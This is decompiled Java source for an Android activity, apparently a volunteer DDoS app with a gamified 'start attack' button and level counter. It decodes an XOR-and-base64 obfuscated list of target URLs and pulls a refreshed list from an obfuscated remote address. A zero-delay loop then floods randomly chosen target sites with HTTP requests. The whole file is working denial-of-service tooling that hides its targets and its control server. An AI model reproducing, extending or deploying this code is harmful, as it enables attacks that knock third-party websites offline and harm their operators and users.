package com.cyber.azov2;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.StrictMode;
import android.util.Base64;
import android.view.View;
import android.widget.LinearLayout;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import com.cyber.azov2.target.DummyTargetProvider;
import com.cyber.azov2.target.TargetProvider;
import com.example.guiproposal.databinding.ActivityMainBinding;
import com.example.guiproposal.databinding.BottomSheetBinding;
import com.google.android.material.bottomsheet.BottomSheetBehavior;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    private static final String EMPTY_STRING = "";
    private static final String KEY = "1234567890abcdefghijklmnopxyz";
    private TargetAdapter adapter;
    private ActivityMainBinding binding;
    private BottomSheetBehavior<LinearLayout> bottomSheetBehavior;
    private BottomSheetBinding bottomSheetBinding;
    private Handler handler;
    private List<String> list_targets;
    private String[] sites;
    private final TargetProvider targetProvider = new DummyTargetProvider();
    private final long timerInterval = 1000;
    private final long timerInterval2 = 0;
    private int timeElapsed = 0;
    private int currentLevel = 1;
    private final Runnable statusChecker = new Runnable() { // from class: com.cyber.azov2.MainActivity.1
        @Override // java.lang.Runnable
        public void run() {
            try {
                MainActivity.this.timeElapsed++;
                MainActivity.this.updateProgressBarText();
            } finally {
                MainActivity.this.handler.postDelayed(this, 1000L);
            }
        }
    };
    private final Runnable attacker = new Runnable() { // from class: com.cyber.azov2.MainActivity.2
        @Override // java.lang.Runnable
        public void run() {
            try {
                Random random = new Random();
                int nextInt = random.nextInt(3) + 1;
                for (int i = 0; i < nextInt; i++) {
                    MainActivity.this.getUrlResponse(MainActivity.this.sites[random.nextInt(MainActivity.this.sites.length)]);
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                MainActivity.this.handler.postDelayed(this, 0L);
            }
        }
    };

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
        String str = "ShBHVUdRUkxKEls5QQwREhcbU0VEAQIdBAYZVxhUV19dW1MZSkwSTUALEBEWFFJGRRkYQAcBBB0LFFRGHUZAFBsaUUQVEhBeSkkKEUcYH0IfG01cWhEORUJADhoZWldKWxcDTQkRFUkaHEhHTgUaGwALQ1UeX1RARhhFTRscQwoXEBUVXUdGBgBCAAsIER4WFB9ARhYZFF9MTUASWExLEhEQRgQPDA0LAQFeCgxYHRBbQEFGRAIWHwwHBAUDCQlGHRxJQE8GGwQICkAeHUlfTxhaXV5RBw0NShcTRURLAh8YHR1VX1cODUYcXl1ZGEVNGxxDChcQFRVdR0YZHR9ACR0FVgsPEx4RXEFCR0sDH04QFhcRCRUNRxgeTkFMBwQMCQkLHRxGQEZbWUAeDAMRDwASRURLAh8YHR1VX1cSCFRfX11bGEVNGxxDChcQFRVdR0YYEQhDHBpSVFsSRUZDRw8ZGFVQVE8QFkZJRA8cHRoYVkJBBh4MHAhXU0saR0MVFBtYFRYTF19JSAQMBB8NQxwaUlRbEkVGQ0cPGRgJTUZPEBZGSUQPHB0aGFZCQRwdFw0IWF8dRkAUakU=";
        try {
            try {
                JSONArray jSONArray = new JSONObject(hash(base64_decode(str))).getJSONArray("targets");
                Random random = new Random();
                this.list_targets = new ArrayList();
                String str2 = EMPTY_STRING;
                int i = 0;
                while (i < 8) {
                    try {
                        String str3 = jSONArray.getString(random.nextInt(10) + 1) + "\n";
                        if (this.list_targets.contains(str3)) {
                            i--;
                        } else {
                            this.list_targets.add(str3);
                            str2 = str2 + str3;
                        }
                        i++;
                    } catch (JSONException e) {
                        e.printStackTrace();
                        return;
                    }
                }
                String urlResponse = getUrlResponse(hash(base64_decode("WUZHREYMGBdaSQMHEQUfCRFGCgUGQwweBF8UEAlFHFlHWlg=")));
                if (!urlResponse.equals(EMPTY_STRING)) {
                    str = urlResponse;
                }
                try {
                    try {
                        try {
                            JSONArray jSONArray2 = new JSONObject(hash(base64_decode(str))).getJSONArray("targets");
                            ArrayList arrayList = new ArrayList();
                            for (int i2 = 0; i2 < jSONArray2.length(); i2++) {
                                try {
                                    arrayList.add(jSONArray2.getString(i2));
                                } catch (JSONException e2) {
                                    e2.printStackTrace();
                                    return;
                                }
                            }
                            String[] strArr = new String[arrayList.size()];
                            this.sites = strArr;
                            arrayList.toArray(strArr);
                            ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
                            this.binding = inflate;
                            setContentView(inflate.getRoot());
                            BottomSheetBinding bind = BottomSheetBinding.bind(this.binding.included.getRoot());
                            this.bottomSheetBinding = bind;
                            BottomSheetBehavior<LinearLayout> from = BottomSheetBehavior.from(bind.bottomSheetLayout);
                            this.bottomSheetBehavior = from;
                            from.setDraggable(false);
                            setupClickListeners();
                            setupRecyclerView();
                            initProgressBar();
                            updateLevel();
                        } catch (JSONException e3) {
                            e3.printStackTrace();
                        }
                    } catch (JSONException e4) {
                        e4.printStackTrace();
                    }
                } catch (Exception unused) {
                }
            } catch (JSONException e5) {
                e5.printStackTrace();
            }
        } catch (JSONException e6) {
            e6.printStackTrace();
        }
    }

    private void setupRecyclerView() {
        this.bottomSheetBinding.attackRecyclerView.setLayoutManager(new LinearLayoutManager(this));
        this.adapter = new TargetAdapter(this.list_targets);
        this.bottomSheetBinding.attackRecyclerView.setAdapter(this.adapter);
    }

    private void setupClickListeners() {
        setupStartStopAttackBtnClickListener();
    }

    private void setupStartStopAttackBtnClickListener() {
        this.bottomSheetBinding.startStopButton.setOnClickListener(new View.OnClickListener() { // from class: com.cyber.azov2.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.this.m42xfef9450f(view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$setupStartStopAttackBtnClickListener$0$com-cyber-azov2-MainActivity  reason: not valid java name */
    public /* synthetic */ void m42xfef9450f(View view) {
        if (this.bottomSheetBehavior.getState() != 3) {
            this.bottomSheetBehavior.setState(3);
            this.bottomSheetBinding.startStopButton.setText(getText(R.string.stop_attack));
            this.adapter.setTargets(this.list_targets);
            startTimer();
            return;
        }
        this.bottomSheetBehavior.setState(4);
        this.bottomSheetBinding.startStopButton.setText(getText(R.string.start_attack));
        stopTimer();
    }

    private void updateLevel() {
        int i;
        if (this.currentLevel == 10) {
            this.binding.levelLabel.setText(R.string.max_level_label);
        } else {
            this.binding.levelLabel.setText(getString(R.string.level_label, new Object[]{Integer.valueOf(this.currentLevel)}));
        }
        switch (this.currentLevel) {
            case 1:
                i = getColor(R.color.level_one);
                break;
            case 2:
                i = getColor(R.color.level_two);
                break;
            case 3:
                i = getColor(R.color.level_three);
                break;
            case 4:
                i = getColor(R.color.level_four);
                break;
            case 5:
                i = getColor(R.color.level_five);
                break;
            case 6:
                i = getColor(R.color.level_six);
                break;
            case 7:
                i = getColor(R.color.level_seven);
                break;
            case 8:
                i = getColor(R.color.level_eight);
                break;
            case 9:
                i = getColor(R.color.level_nine);
                break;
            case 10:
                i = getColor(R.color.teal_200);
                break;
            default:
                i = getColor(R.color.level_one);
                break;
        }
        this.binding.levelLabel.setTextColor(i);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void updateProgressBarText() {
        if (this.timeElapsed == 100) {
            this.timeElapsed = 0;
            int i = this.currentLevel;
            if (i < 10) {
                this.currentLevel = i + 1;
                updateLevel();
            }
            initProgressBar();
        }
        this.binding.progressTv.setText(EMPTY_STRING + this.timeElapsed + "%");
        this.binding.progressbar.setProgress(this.timeElapsed);
    }

    private void startTimer() {
        this.handler = new Handler(Looper.getMainLooper());
        this.statusChecker.run();
        this.attacker.run();
    }

    private void stopTimer() {
        this.handler.removeCallbacks(this.statusChecker);
        this.handler.removeCallbacks(this.attacker);
    }

    private void initProgressBar() {
        this.binding.progressTv.setText("0%");
    }

    public String hash(String str) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            sb.append((char) (str.charAt(i) ^ KEY.charAt(i % 29)));
        }
        return sb.toString();
    }

    public String base64_decode(String str) {
        try {
            try {
                return new String(Base64.decode(str.getBytes("UTF-8"), 0), "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
                return EMPTY_STRING;
            }
        } catch (UnsupportedEncodingException e2) {
            e2.printStackTrace();
            return EMPTY_STRING;
        }
    }

    public String getUrlResponse(String str) {
        try {
            try {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
                httpURLConnection.setConnectTimeout(2000);
                httpURLConnection.setReadTimeout(2000);
                try {
                    return readStream(new BufferedInputStream(httpURLConnection.getInputStream()));
                } catch (IOException e) {
                    e.printStackTrace();
                    return EMPTY_STRING;
                } finally {
                    httpURLConnection.disconnect();
                }
            } catch (IOException e2) {
                e2.printStackTrace();
                return EMPTY_STRING;
            }
        } catch (MalformedURLException e3) {
            e3.printStackTrace();
            return EMPTY_STRING;
        }
    }

    public static String readStream(InputStream inputStream) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        StringBuilder sb = new StringBuilder();
        while (true) {
            try {
                try {
                    try {
                        String readLine = bufferedReader.readLine();
                        if (readLine == null) {
                            break;
                        }
                        sb.append(readLine + "\n");
                    } catch (IOException e) {
                        e.printStackTrace();
                        inputStream.close();
                    }
                } catch (Throwable th) {
                    try {
                        inputStream.close();
                    } catch (IOException e2) {
                        e2.printStackTrace();
                    }
                    throw th;
                }
            } catch (IOException e3) {
                e3.printStackTrace();
            }
        }
        inputStream.close();
        return sb.toString();
    }
}